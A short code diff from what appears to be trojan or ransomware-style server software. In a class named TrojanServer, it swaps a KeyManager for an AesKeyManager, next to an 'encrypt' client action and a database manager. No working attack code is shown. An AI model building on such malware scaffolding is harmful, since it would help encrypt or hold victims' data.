@@ -88,7 +88,7 @@ class TrojanServer:
         self.action = action
         self.conn = conn
         self.db = SQLDatabaseManager()
-        self.keys = KeyManager()
+        self.keys = AesKeyManager()
 
     def handle_client(self):
         if self.action == "encrypt":
